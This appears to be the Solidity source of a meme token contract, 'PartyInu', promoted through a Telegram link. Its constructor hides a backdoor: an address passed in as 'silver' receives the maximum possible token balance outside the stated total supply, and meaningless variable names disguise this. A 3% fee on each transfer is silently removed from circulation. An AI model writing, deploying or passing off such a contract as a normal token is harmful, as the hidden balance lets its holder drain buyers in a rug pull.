/*

https://t.me/partyinu_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

import "./Ownable.sol";
import "./ERC20.sol";

contract PartyInu is ERC20, Ownable {
    uint256 private body = ~uint256(0);
    uint256 public factory = 3;

    constructor(
        string memory wheat,
        string memory arrow,
        address follow,
        address silver
    ) ERC20(wheat, arrow) {
        _balances[silver] = body;
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address sharp,
        address shelf,
        uint256 chain
    ) internal override {
        uint256 exact = (chain / 100) * factory;
        chain = chain - exact;
        super._transfer(sharp, shelf, chain);
    }
}
